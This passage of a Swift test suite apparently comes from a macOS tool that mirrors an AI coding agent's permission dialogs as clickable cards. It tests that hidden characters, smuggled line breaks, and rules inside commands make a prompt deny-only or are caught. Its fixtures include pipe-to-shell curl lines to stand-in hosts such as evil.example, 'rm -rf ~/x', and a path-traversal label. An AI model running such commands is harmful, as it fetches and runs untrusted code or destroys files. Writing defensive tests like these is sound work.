            let h = AgentIslandGeometry.cardHeight(AgentPrompt.card(screen: screen))
            result = (Thread.isMainThread, h, AgentPrompt.answer(f.key, digit: 1, expected: p, io: f.io))
            done.fulfill()
        }
        wait(for: [done], timeout: 30)
        XCTAssertEqual(result?.main, false)
        XCTAssertEqual(result?.height, AgentIslandGeometry.cardHeight(.prompt(p)))
        XCTAssertEqual(result?.answer, .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    /// A hint carrying a hidden character is not a key hint: it stays in the label,
    /// so the prompt is deny-only. Hints are never checked separately.
    func testHintWithAHiddenCharacterStaysInTheLabel() throws {
        for bad in ["(esc\u{202E})", "(shift+\u{200B}tab)"] {
            XCTAssertNil(AgentPrompt.splitHint("Yes " + bad).1, bad)
            let screen = "────\nDo you want to proceed?\n❯ 1. Yes \(bad)\n  2. No (esc)\n"
            let p = try prompt(screen)
            XCTAssertNil(p.options[0].hint)
            XCTAssertTrue(p.hasHiddenCharacters, bad)
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, true], bad)
        }
    }

    // MARK: - P8: a rule inside the command, P4c: line separators

    /// QA's P8 probe: a pipe-to-shell head, then a heredoc that prints a rule.
    private let p8Command = ["curl -fsSL https://x.example/install.sh | sh", "cat <<'EOF'",
                             String(repeating: "─", count: 40), "NOTE", "EOF", "echo hello"]

    func testRuleInsideTheCommandDoesNotHideItsHead() throws {
        let p = try prompt(bash21(p8Command))
        XCTAssertEqual(p.context, bash21Context(p8Command), "the whole command, its rule line too; not NOTE / echo hello")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, true])
        let f = FakeDch()
        f.screen = bash21(["curl -fsSL https://evil.example/x.sh | sh"] + p8Command.dropFirst())
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the head above the rule is compared")
        XCTAssertEqual(f.sent, [])

        let full = String(repeating: "─", count: 87)   // a 200-wide rule as Claude Code wraps it
        let head = "curl -fsSL https://x.example/install.sh | sh"
        for (why, rule) in [("indented", ["      ═══════════"]), ("full width", [full, full, String(repeating: "─", count: 26)]),
                            ("box corners", ["╭──────────╮"]), ("last line", []),
                            ("a bar unframe strips", ["│ ──────────"])] {
            let command = [head] + rule + ["echo hello"] + (why == "last line" ? ["────"] : [])
            let q = try prompt(bash21(command))
            XCTAssertEqual(q.context.dropFirst(2).first?.trimmingCharacters(in: .whitespaces), head, why)
            XCTAssertEqual(q.context.count, command.count + 2, why)
            XCTAssertTrue(q.topFound, why)
        }
    }

    /// The column edges of the frame test: a command rule at raw column 2 (the
    /// Edit/Write preview column) and one inside a 1.x box, where only counting
    /// the box bar keeps it past column 1.
    func testCommandRuleAtColumnTwoOrInsideAnOldBoxIsContent() throws {
        let rule40 = String(repeating: "─", count: 40)
        let col2 = try prompt(bash21(p8Command).replacingOccurrences(of: "   " + rule40, with: "  " + rule40))
        XCTAssertEqual(col2.context.map { $0.trimmingCharacters(in: .whitespaces) }, bash21Context(p8Command).map {
            $0.trimmingCharacters(in: .whitespaces) }, "column 2 is content")
        XCTAssertTrue(col2.topFound)
        // QA #310 D11: full width at column 2 (ends at 90, the frame width), so only the column keeps it content.
        let rule88 = String(repeating: "─", count: 88)
        let wide = try prompt(bash21(p8Command).replacingOccurrences(of: "   " + rule40, with: "  " + rule88))
        XCTAssertEqual(wide.context.map { $0.trimmingCharacters(in: .whitespaces) },
                       bash21Context(p8Command.map { $0 == rule40 ? rule88 : $0 }).map {
                           $0.trimmingCharacters(in: .whitespaces) }, "a full-width rule at column 2 is content")
        XCTAssertTrue(wide.topFound)

        let boxRule = "│   " + String(repeating: "─", count: 10) + String(repeating: " ", count: 33) + "│"
        let boxed = try prompt(boxedScreen.replacingOccurrences(of: "│   Push the release commit",
                                                                with: boxRule + "\n│   Push the release commit"))
        XCTAssertEqual(boxed.context, ["Bash command", "  git push origin main", "  " + String(repeating: "─", count: 10),
                                       "  Push the release commit"], "the head above the rule is shown")
        XCTAssertTrue(boxed.topFound)
        XCTAssertEqual(boxed.options.map { boxed.isEnabled($0) }, [true, true])
    }

    /// The dialog's top is off screen (or the screen has none) and a rule sits in
    /// the command: what is above the rule can not be known, so only No answers.
    func testRuleInsideACommandWithNoDialogTopIsDenyOnly() throws {
        let scrolled = bash21(p8Command).split(separator: "\n", omittingEmptySubsequences: false)
            .drop(while: { !$0.contains("cat <<") }).joined(separator: "\n")
        let bare = ([" Bash command", ""] + p8Command.map { "   " + $0 }
            + ["", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"]).joined(separator: "\n")
        for (why, screen, enabled) in [("head scrolled off", scrolled, [false, false, true]),
                                       ("no rule on screen", bare, [false, true])] {
            let p = try prompt(screen)
            XCTAssertFalse(p.topFound, why)
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, enabled, why)
            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption, why)
            let f = FakeDch()
            f.screen = screen
            XCTAssertEqual(f.answer(1, expected: p), .changed, why)
            XCTAssertEqual(f.answer(p.options.count, expected: p), .sent, why)
            XCTAssertEqual(f.sent, ["\(p.options.count)"], why)
        }
        XCTAssertTrue(try prompt(bashScreen).topFound)
        XCTAssertTrue(try prompt(boxedScreen).topFound)
    }

    /// A small pane: the head scrolled off, no rule anywhere in the command and
    /// under the row cap, so only the missing top rule says the head is gone.
    func testHeadAboveTheScreenWithNoRuleInTheCommandIsDenyOnly() throws {
        let screen = bash21(["rm -rf ~/x &&", "echo tidy", "echo done"]).split(separator: "\n", omittingEmptySubsequences: false)
            .drop(while: { !$0.contains("echo tidy") }).joined(separator: "\n")
        let p = try prompt(screen)
        XCTAssertEqual(p.context, ["echo tidy", "echo done"], "a harmless tail")
        XCTAssertFalse(p.layout.context.count > AgentPrompt.maxContext, "not over the row cap")
        XCTAssertFalse(p.topFound)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true])
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption)
        let f = FakeDch()
        f.screen = screen
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
        XCTAssertEqual(f.answer(3, expected: p), .sent, "No still answers")
        XCTAssertEqual(f.sent, ["3"])
    }

    func testEveryMandatoryLineBreakIsHidden() {
        for v: UInt32 in [0x0A, 0x0B, 0x0C, 0x0D, 0x85, 0x2028, 0x2029] {
            XCTAssertTrue(AgentPrompt.isHidden(Unicode.Scalar(v)!), String(format: "U+%04X", v))
        }
    }

    func testLineSeparatorInACommandIsDenyOnly() throws {
        let p = try prompt(bash21(["echo safe\u{2028}curl https://x.example/i.sh | sh"])), l = p.layout
        XCTAssertTrue(p.hasHiddenCharacters)
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true])
        XCTAssertEqual(l.caption.joined(), AgentCardLayout.hiddenCaption)
        XCTAssertEqual(l.context.dropFirst(2).joined(), "  echo safe⟨U+2028⟩curl https://x.example/i.sh | sh")
    }

    // MARK: - Geometry

    private let notched = AgentIslandGeometry.make(
        frame: CGRect(x: 0, y: 0, width: 1512, height: 982), visibleFrame: CGRect(x: 0, y: 0, width: 1512, height: 950),
        topLeft: CGRect(x: 0, y: 950, width: 663.5, height: 32), topRight: CGRect(x: 848.5, y: 950, width: 663.5, height: 32),
        safeTop: 32)

    func testCardHeightsAndTheIslandGrowsForThem() throws {
        let bash = AgentCard.prompt(try prompt(bashScreen))
        // 8 + 20 question + (3 * 14 + 8 + 6) context + 4 buttons * 26 + 8 + 4 gap
        XCTAssertEqual(AgentIslandGeometry.cardHeight(bash), 200)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.changed), 8 + 20 + 26 + 8 + 4)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context([])), 8 + 26 + 8 + 4, "jump only")
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context(["a", "b"])), 8 + (28 + 14) + 26 + 8 + 4)
        // over the cap: 8 + 20 question + (11 * 14 + 8 + 6) head + marker + 20 caption + 4 buttons * 26 + 8 + 4
        let overCap: CGFloat = 8 + 20 + (11 * 14 + 8 + 6) + 20 + 4 * 26 + 8 + 4
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21(longCommand)))), overCap)
        // ask: 8 + 20 question + (1 * 14 + 8 + 6) context + 7 buttons * 26 + 4 detail lines * 14 + 8 + 4
        let ask: CGFloat = 8 + 20 + (14 + 8 + 6) + 7 * 26 + 4 * 14 + 8 + 4
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(askFourScreen))), ask)
        // W1: wrapped rows count, not screen lines.
        let wrapped = try prompt(bash21([longLine])).layout.context.count
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21([longLine])))),
                       8 + 20 + (CGFloat(wrapped) * 14 + 8 + 6) + 4 * 26 + 8 + 4)
        // past the cap by wrapping: 10 rows + marker, the caption row
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21(wideCommand)))), overCap)
        // a wide label: the caption row and the label's continuation rows (16 each)
        let wide = try prompt(bash21(["echo safe"], allow: wideAllow)), extra = wide.layout.labels[1].count - 1
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(wide)),
                       8 + 20 + (3 * 14 + 8 + 6) + 20 + 4 * 26 + CGFloat(extra) * 16 + 8 + 4)
        let alone = AgentCardLayout.contextRows([longLine]).rows.count
        XCTAssertGreaterThan(alone, 1)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context([longLine])),
                       8 + (CGFloat(alone) * 14 + 14) + 26 + 8 + 4, "the context-only card wraps too")

        XCTAssertEqual(notched.expandedSize(rows: 3, cards: 200).height, notched.expandedSize(rows: 3).height + 200,
                       "grown, not clipped")
        XCTAssertFalse(notched.listScrolls(rows: 3, cards: 200))
        XCTAssertEqual(notched.maxListHeight, 982 - 32 - 4 - 12 - 40)
        XCTAssertEqual(notched.listHeight(rows: 6, cards: 2000), notched.maxListHeight, "capped above the screen bottom")
        XCTAssertTrue(notched.listScrolls(rows: 6, cards: 2000))
        XCTAssertTrue(notched.listScrolls(rows: 7))
    }

    @MainActor
    func testStoreCountsCardsOfBlockedRowsOnly() throws {
        let store = AgentIslandStore(geometry: notched)
        let b = AgentSession(key: AgentSessionKey(dir: "/d", name: "b"), alias: "", activity: 1, state: .blocked, agents: 0)
        let w = AgentSession(key: AgentSessionKey(dir: "/d", name: "w"), alias: "", activity: 1, state: .working, agents: 0)
        store.sessions = [b, w]
        store.expanded = true
        store.cards = [b.key: .changed, w.key: .changed]
        XCTAssertEqual(store.card(for: b), .changed)
        XCTAssertNil(store.card(for: w), "a card left over on a row that stopped blocking is not shown")
        XCTAssertEqual(store.size, notched.expandedSize(rows: 2, cards: AgentIslandGeometry.cardHeight(.changed)))
    }

    // MARK: - Render (visual evidence, no window)

    @MainActor
    func testRendersBashAndAskCardsOffscreen() throws {
        let out = tempDir()
        for (name, alias, screen) in [("agent-island-card-bash", "clean rebuild", bashScreen),
                                      ("agent-island-card-ask", "deploy the release", askFourScreen),
                                      ("agent-island-card-overcap", "long command", bash21(longCommand)),
                                      ("agent-island-card-wrapped", "allow a long path",
                                       bash21(["swift build"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project")),
                                      ("agent-island-card-longcommand", "install deps", bash21([longLine, cjkLine])),
                                      ("agent-island-card-widelabel", "allow a wide path", bash21(["swift build"], allow: wideAllow)),
                                      ("agent-island-card-hidden", "hidden characters", hiddenScreen)] {
            try render(name, alias: alias, card: AgentPrompt.card(screen: screen), to: out)
        }
    }

    /// The island with one blocked row showing `card`, offscreen, as
    /// `<name>.png` in `out` (and in `PROSPER_RENDER_DIR` when set).
    @MainActor
    private func render(_ name: String, alias: String, card: AgentCard?, to out: URL) throws {
        let now = Date().timeIntervalSince1970
        let extra = ProcessInfo.processInfo.environment["PROSPER_RENDER_DIR"].map { URL(fileURLWithPath: $0) }
        let store = AgentIslandStore(geometry: notched)
        let blocked = AgentSession(key: AgentSessionKey(dir: "/d", name: "fix-auth"), alias: alias,
                                   activity: now - 12, state: .blocked, agents: 0)
        store.sessions = [blocked,
                          AgentSession(key: AgentSessionKey(dir: "/d", name: "prosper-ios"), alias: "",
                                       activity: now - 240, state: .working, agents: 2),
                          AgentSession(key: AgentSessionKey(dir: "/d", name: "payhawk-apps"),
                                       alias: "ship release notes", activity: now - 7200, state: .done, agents: 0)]
        store.cards[blocked.key] = card
        store.expanded = true
        let r = ImageRenderer(content: AgentIslandView(store: store).padding(20).background(Color(white: 0.75)))
        r.scale = 2
        let cg = try XCTUnwrap(r.cgImage, name)
        XCTAssertEqual(CGFloat(cg.width), (store.size.width + 40) * 2, name)
        XCTAssertEqual(CGFloat(cg.height), (store.size.height + 40) * 2, name)
        let png = try XCTUnwrap(NSBitmapImageRep(cgImage: cg).representation(using: .png, properties: [:]))
        try png.write(to: out.appendingPathComponent("\(name).png"))
        if let extra { try png.write(to: extra.appendingPathComponent("\(name).png")) }
    }

    // MARK: - #483 item 1: only a dialog at the bottom of the screen is live

    /// QA #301 L2: an old dialog printed above a shell prompt (dch reads blocked on
    /// its quoted footer). A click would type a digit into the shell.
    func testStaticCopyOfADialogAboveAShellPromptIsNotActionable() throws {
        let live = bash21(["echo safe"]), rule = String(repeating: "─", count: 90)
        let p = try prompt(live)
        for (why, screen) in [("footer, then a prompt", live + "\nuser@host proj % "),
                              ("blank line, then output", live + "\n\nls: done\n"),
                              ("Claude's idle input box", live + "\n" + rule + "\n❯ \n" + rule + "\n  ? for shortcuts"),
                              ("no footer, a prompt after a blank", bashScreen + "\n\n$ "),
                              ("no footer, a prompt right under the last option", bashScreen + "\nuser@host proj % "),
                              ("1.x box, then a prompt", boxedScreen + "\n$ ")] {
            XCTAssertNil(AgentPrompt.parse(screen), why)
            if case .prompt = AgentPrompt.card(screen: screen) { XCTFail("an actionable card: \(why)") }
            let f = FakeDch()
            f.screen = screen
            XCTAssertEqual(f.answer(1, expected: p), .changed, why)
            XCTAssertEqual(f.answer(3, expected: p), .changed, why)
            XCTAssertEqual(f.sent, [], why)
        }
        // Still live: trailing blanks, a closing rule, a wrapped last option over its footer.
        XCTAssertEqual(try prompt(live + "\n\n   \n"), p)
        XCTAssertNotNil(AgentPrompt.parse(bashScreen + "\n" + rule + "\n"))
        let wrapped = live.replacingOccurrences(of: "   3. No", with: "   3. No, and tell Claude what to do\n      differently")
        XCTAssertEqual(try prompt(wrapped).options[2].detail, ["differently"])
        XCTAssertNil(AgentPrompt.parse(wrapped.replacingOccurrences(of: " Esc to cancel · Tab to amend", with: "")),
                     "a last option's detail with nothing under it could be a shell prompt")
    }

    // MARK: - #483 item 2: hidden scalars by Unicode property

    func testIsHiddenKeepsEveryOldRangeAndCatchesTheMissedScalars() {
        let old: [ClosedRange<UInt32>] = [0x00...0x1F, 0x7F...0x9F, 0xAD...0xAD, 0x61C...0x61C, 0x200B...0x200F,
                                          0x2028...0x2029, 0x202A...0x202E, 0x2060...0x2064, 0x2066...0x2069, 0xFEFF...0xFEFF]
        let missed: [ClosedRange<UInt32>] = [0x34F...0x34F, 0x115F...0x1160, 0x3164...0x3164, 0xFFA0...0xFFA0,
                                             0x17B4...0x17B5, 0x2065...0x2065, 0x206A...0x206F, 0xFFF9...0xFFFB,
                                             0x1D173...0x1D17A, 0xE0001...0xE007F, 0x1BCA0...0x1BCA0]
        for (what, ranges) in [("old", old), ("missed", missed)] {
            for v in ranges.joined() {
                XCTAssertTrue(AgentPrompt.isHidden(Unicode.Scalar(v)!), "\(what) U+\(String(format: "%04X", v))")
            }
        }
        for v: UInt32 in 0xFE00...0xFE0F { XCTAssertFalse(AgentPrompt.isHidden(Unicode.Scalar(v)!), "VS U+\(String(v, radix: 16))") }
        for c in "a ~漢😀é\u{301}─│❯✔" { XCTAssertFalse(c.unicodeScalars.contains(where: AgentPrompt.isHidden), "\(c)") }
    }

    func testMissedScalarInACommandIsDenyOnlyAndEmojiStayApprovable() throws {
        for v: UInt32 in [0x3164, 0x34F, 0xE0041, 0x1D173] {
            let s = "echo a\(Character(Unicode.Scalar(v)!))b"
            let p = try prompt(bash21([s]))
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], s)
            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.hiddenCaption, s)
            XCTAssertEqual(p.layout.context, bash21Context(["echo a⟨U+\(String(format: "%04X", v))⟩b"]))
        }
        // U+FE0F (emoji presentation) renders literally and stays approvable.
        let emoji = try prompt(bash21(["echo ❤️ ✔️ done"], allow: "/Users/probe/☕️"))
        XCTAssertFalse(emoji.hasHiddenCharacters)
        XCTAssertEqual(emoji.options.map { emoji.isEnabled($0) }, [true, true, true])
        XCTAssertEqual(emoji.layout.caption, [])
        // A ZWJ sequence stays hidden (as before #483): U+200D can glue anything.
        let zwj = try prompt(bash21(["echo 👨‍👩‍👧"]))
        XCTAssertTrue(zwj.hasHiddenCharacters)
        XCTAssertEqual(zwj.options.map { zwj.isEnabled($0) }, [false, false, true])
    }

    // MARK: - #483 item 3: blank lines inside a command

    func testBlankLinesInsideACommandAreShownAndCompared() throws {
        let heredoc = ["cat > run.sh <<'EOF'", "echo one", "", "echo two", "EOF"]
        let p = try prompt(bash21(heredoc))
        XCTAssertEqual(p.context, bash21Context(heredoc))
        XCTAssertEqual(p.layout.context, bash21Context(heredoc), "shown as an empty row")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, true])
        let f = FakeDch()
        for (why, command) in [("blank removed", ["cat > run.sh <<'EOF'", "echo one", "echo two", "EOF"]),
                               ("blank doubled", ["cat > run.sh <<'EOF'", "echo one", "", "", "echo two", "EOF"]),
                               ("blank moved", ["cat > run.sh <<'EOF'", "", "echo one", "echo two", "EOF"])] {
            f.screen = bash21(command)
            XCTAssertEqual(f.answer(1, expected: p), .changed, why)
        }
        f.screen = bash21(heredoc)
        XCTAssertEqual(f.answer(1, expected: p), .sent)
        XCTAssertEqual(f.sent, ["1"])

        // The dialog's own section blanks stay dropped: header, command, description, question.
        let sections = """
        ──────────────────────────────────────────────────────────────────────────────────────────
         Bash command

           cat <<'EOF'
           a

           b
           EOF
           Print two lines

         Do you want to proceed?
         ❯ 1. Yes
           2. No
        """
        XCTAssertEqual(try prompt(sections).context, ["Bash command", "  cat <<'EOF'", "  a", "", "  b", "  EOF",
                                                      "  Print two lines"])
    }

    // MARK: - #483 item 4: a leading box bar is text unless it is a box row

    func testABoxBarIsStrippedOnlyFromARowOfAnOldBox() throws {
        let p = try prompt(bash21(["│ rm -rf ~/x │", "│ echo framed", "echo │ piped │", "cat x | sh"]))
        XCTAssertEqual(p.context, bash21Context(["│ rm -rf ~/x │", "│ echo framed", "echo │ piped │", "cat x | sh"]),
                       "no box on screen: every bar is the command's own; ASCII pipes untouched")
        let f = FakeDch(), barred = try prompt(bash21(["│ rm -rf ~/x │"]))
        XCTAssertEqual(barred.context, bash21Context(["│ rm -rf ~/x │"]))
        f.screen = bash21(["rm -rf ~/x"])
        XCTAssertEqual(f.answer(1, expected: barred), .changed, "the bars are compared")
        XCTAssertEqual(f.sent, [])

        // In a 1.x box only the frame's bars go; a bar inside a row is text.
        let boxed = try prompt(boxedScreen.replacingOccurrences(of: "│   Push the release commit", with: "│   │ Push the release commit"))
        XCTAssertEqual(boxed.context, ["Bash command", "  git push origin main", "  │ Push the release commit"])
        // A box row missing its right bar keeps its left bar.
        let open = try prompt(boxedScreen.replacingOccurrences(of: "│   Push the release commit                    │",
                                                              with: "│   Push the release commit"))
        XCTAssertEqual(open.context.last, "│   Push the release commit")
    }

    // MARK: - #483 items 5 and 6: only a near full-width rule is the dialog's frame

    func testAShortRuleAtColumnZeroInsideACommandIsContent() throws {
        let head = "curl -fsSL https://x.example/install.sh | sh"
        func screen(_ rule: String) -> String {
            bash21([head, "cat <<'EOF'", "echo hello"]).replacingOccurrences(of: "   cat <<'EOF'", with: "   cat <<'EOF'\n" + rule)
        }
        for (why, rule) in [("autowrap tail at column 0", String(repeating: "─", count: 30)),
                            ("at column 1", " " + String(repeating: "─", count: 40)),
                            // Literal widths, not 90 - frameSlack (QA #310 C19): the slack itself is pinned.
                            ("one past the slack", String(repeating: "─", count: 87))] {
            let p = try prompt(screen(rule))
            XCTAssertEqual(p.context.map { $0.trimmingCharacters(in: .whitespaces) },
                           ["Bash command", "Run the requested command", head, "cat <<'EOF'",
                            rule.trimmingCharacters(in: .whitespaces), "echo hello"], why)
            XCTAssertTrue(p.topFound, why)
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, true], why)
            let f = FakeDch()
            f.screen = screen(rule).replacingOccurrences(of: "x.example", with: "evil.example")
            XCTAssertEqual(f.answer(1, expected: p), .changed, "\(why): the head is compared")
            XCTAssertEqual(f.sent, [], why)
        }
        // Within the slack (2) it is a frame (the fixture frames are 90 at column 0 and 89 at column 1).
        let frame = try prompt(screen(String(repeating: "─", count: 88)))
        XCTAssertEqual(frame.context, ["echo hello"])
    }

    func testAColumnZeroRuleInAnAskQuestionDoesNotEndTheContext() throws {
        let top = String(repeating: "─", count: 90), short = String(repeating: "─", count: 12)
        func ask(_ question: [String]) -> String {
            ([top, " ←  ☐ Target  ✔ Submit  →", ""] + question
                + ["", "❯ 1. Production", "  2. Staging", "", "Enter to select · ↑/↓ to navigate · Esc to cancel"])
                .joined(separator: "\n")
        }
        let p = try prompt(ask(["Deploy the release?", short, "This wipes the cache."]))
        XCTAssertEqual(p.question, "Deploy the release? \(short) This wipes the cache.", "#526: every line under the chips")
        XCTAssertEqual(p.context, ["←  ☐ Target  ✔ Submit  →"])
        XCTAssertTrue(p.topFound)
        let f = FakeDch()
        f.screen = ask(["Wipe production?", short, "This wipes the cache."])
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
        // The rule as the question's last line: still part of the question.
        let q = try prompt(ask(["Deploy the release?", short]))
        XCTAssertEqual(q.question, "Deploy the release? \(short)")
        XCTAssertEqual(q.context, ["←  ☐ Target  ✔ Submit  →"])
        XCTAssertTrue(q.topFound)
    }

    // MARK: - #483 item 7: a CR is hidden wherever it is

    func testCarriageReturnInACommandOrLabelIsDenyOnly() throws {
        for (why, screen) in [("CRLF in a command", bash21(["echo safe\r\ncurl https://x.example/i.sh | sh"])),
                              ("lone CR in a command", bash21(["echo safe\rcurl https://x.example/i.sh | sh"])),
                              ("CR in a label", bash21(["echo safe"], allow: "/Users/probe/proj\r/../../etc")),
                              ("CR closing the screen", bashScreen + "\r")] {
            let p = try prompt(screen)
            XCTAssertTrue(p.hasHiddenCharacters, why)
            XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], why)
            XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.hiddenCaption, why)
            XCTAssertTrue((p.layout.context + p.layout.labels.joined()).joined().contains("⟨U+000D⟩"), why)
        }
        // A whole screen in CRLF is one line: no card to answer.
        guard case .context = AgentPrompt.card(screen: bash21(["echo safe"]).replacingOccurrences(of: "\n", with: "\r\n"))
        else { return XCTFail("CRLF screen") }
    }

    // MARK: - #483 items 8 and 9: the off-screen top

    func testOffTopCaptionAndItsPriority() throws {
        func scrolled(_ command: [String]) -> String {
            bash21(["rm -rf ~/x &&"] + command).split(separator: "\n", omittingEmptySubsequences: false)
                .drop(while: { !$0.contains(command[0]) }).joined(separator: "\n")
        }
        let short = try prompt(scrolled(["echo tidy"]))
        XCTAssertFalse(short.topFound)
        XCTAssertEqual(short.layout.caption, [AgentCardLayout.offTopCaption], "one row")
        XCTAssertEqual(short.options.map { short.isEnabled($0) }, [false, false, true])
        let long = try prompt(scrolled(wideCommand))
        XCTAssertTrue(AgentCardLayout.contextRows(long.context).overCap, "over the cap too")
        XCTAssertEqual(long.layout.caption.joined(), AgentCardLayout.offTopCaption, "off top wins over too long")
        let hidden = try prompt(scrolled(["echo \u{202E}tidy"]))
        XCTAssertEqual(hidden.layout.caption.joined(), AgentCardLayout.hiddenCaption, "hidden wins over off top")
        XCTAssertEqual(try prompt(bash21(wideCommand)).layout.caption.joined(), AgentCardLayout.tooLongCaption)
    }

    /// Pinned on purpose (QA #297 r4): an AskUserQuestion form scrolled past its
    /// top has no "No…" option, so every option is off and the card only jumps.
    func testHeaderlessAskWithItsTopOffScreenHasEveryOptionOff() throws {
        let screen = askFourScreen.split(separator: "\n", omittingEmptySubsequences: false)
            .drop(while: { !$0.hasPrefix("Which deployment") }).joined(separator: "\n")
        let p = try prompt(screen)
        XCTAssertEqual(p.question, "Which deployment target?")
        XCTAssertEqual(p.context, [])
        XCTAssertFalse(p.topFound)
        XCTAssertFalse(p.options.contains { $0.style(first: false) == .deny })
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, Array(repeating: false, count: 6))
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.offTopCaption)
        let f = FakeDch()
        f.screen = screen
        for d in 1...6 { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(d)") }
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - #483 item 10: the card draws each text with the font it measured it with

    private struct Drawn: Hashable { let text: String; let font: ObjectIdentifier }

    /// Renders each card offscreen (no window) with a hook on the card's one Text
    /// constructor: every row the layout measured is drawn, with the CTFont it
    /// was measured with (Q18b: a site drawing with another font drops out).
    @MainActor
    func testRendersEveryCardTextWithItsMeasuringFont() throws {
        var drawn: Set<Drawn> = []
        AgentPromptCardView.textHook = { drawn.insert(Drawn(text: $0, font: ObjectIdentifier($1))) }
        defer { AgentPromptCardView.textHook = nil }
        func draw(_ card: AgentCard) throws {
            drawn = []
            let r = ImageRenderer(content: AgentPromptCardView(card: card).frame(width: G.cardInner + 2 * G.cardPad))
            _ = try XCTUnwrap(r.cgImage)
        }
        func expect(_ rows: [String], _ f: CTFont, _ what: String) {
            for r in rows { XCTAssertTrue(drawn.contains(Drawn(text: r, font: ObjectIdentifier(f))), "\(what): \(r)") }
        }
        let screens = [bashScreen, askFourScreen, bash21(longCommand), bash21([longLine, cjkLine]),
                       bash21(["echo safe"], allow: wideAllow), bash21(["swift build"], allow: "/Users/probe/", wrap: "proj"),
                       hiddenScreen, editScreen, rowLayoutScreen]
        for screen in screens {
            let p = try prompt(screen), l = p.layout
            try draw(.prompt(p))
            expect(l.question + l.caption, G.questionFont, "question/caption")
            expect(l.context, G.contextFont, "context")
            expect(l.preview, l.previewFont, "preview")
            expect(l.labels.joined().map { $0 }, G.labelFont, "label")
            expect(l.details.joined().map { $0 }, G.detailFont, "detail")
            expect(p.options.map { "\($0.digit)" }, G.digitFont, "digit")
            expect(p.options.compactMap(\.hint), G.hintFont, "hint")
            expect([AgentPromptCardView.jumpText], G.labelFont, "jump")
        }
        let lines = AgentPrompt.tail(codexScreen)
        try draw(.context(lines))
        expect(AgentCardLayout.contextRows(lines).rows, G.contextFont, "context-only card")
        try draw(.changed)
        expect([AgentPromptCardView.changedText], G.questionFont, "changed")
    }

    // MARK: - #483 item 11: a cache test that needs no other test

    /// Q16: layouts keyed on less than the whole prompt (the question) would hand
    /// one command's layout to another. Own cache, own counter.
    func testPromptsSharingAQuestionGetTheirOwnLayouts() throws {
        let c = AgentCardLayoutCache()
        let a = try prompt(bash21(["echo safe"])), b = try prompt(bash21(["rm -rf ~/x"]))
        XCTAssertEqual(a.question, b.question)
        XCTAssertEqual(a.layout(in: c).context, bash21Context(["echo safe"]))
        XCTAssertEqual(b.layout(in: c).context, bash21Context(["rm -rf ~/x"]))
        XCTAssertEqual(c.builds, 4, "two layouts and two context-row sets, none shared")
        XCTAssertEqual(a.layout(in: c).context, bash21Context(["echo safe"]))
        XCTAssertEqual(c.builds, 4)
    }

    // MARK: - QA #310 F0: the real 2.1.309 dialogs, every line from the top rule down

    /// `screen` with `from` (present exactly once) replaced by `to`.
    private func altered(_ screen: String, _ from: String, _ to: String,
                         file: StaticString = #filePath, line: UInt = #line) -> String {
        XCTAssertEqual(screen.components(separatedBy: from).count, 2, "once: \(from)", file: file, line: line)
        return screen.replacingOccurrences(of: from, with: to)
    }

    /// `alt` parses to the same question and options as `p` but is not equal to it.
    private func assertOnlyTheContextDiffers(_ alt: String, from p: AgentPrompt, _ why: String,
                                             file: StaticString = #filePath, line: UInt = #line) throws {
        let q = try prompt(alt, file: file, line: line)
        XCTAssertEqual(q.question, p.question, why, file: file, line: line)
        XCTAssertEqual(q.options, p.options, "\(why): the same option list", file: file, line: line)
        XCTAssertNotEqual(q, p, why, file: file, line: line)
    }

    private let tip = #"Tip: auto mode handles these prompts for you — choose "switch to auto mode" below"#

    func testRealOneLineBashShowsItsCommandAndStaysApprovable() throws {
        let p = try prompt(run2Screen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", tip, "Run /usr/bin/true with qa310 argument", "/usr/bin/true qa310",
                                   "This command requires approval"], "title to reason line, the dashed frames left out")
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, and don’t ask again for: /usr/bin/true qa310 *",
                                                "Yes, and switch to auto mode · auto mode handles these prompts for you", "No"])
        XCTAssertTrue(p.topFound)
        XCTAssertFalse(p.isOverCap)
        XCTAssertTrue(p.shownContext.contains("/usr/bin/true qa310"), "the card shows the command")
        // Option 3 switches to auto mode (OQ-45): only it is off, under the mode caption, though it wraps.
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [true, true, false, true])
        XCTAssertEqual(p.layout.caption.joined(), AgentCardLayout.modeCaption, "the command fits: not too long")

        let f = FakeDch()
        f.screen = altered(run2Screen, "\n /usr/bin/true qa310\n╌", "\n /usr/bin/false qa310\n╌")
        try assertOnlyTheContextDiffers(f.screen, from: p, "command")
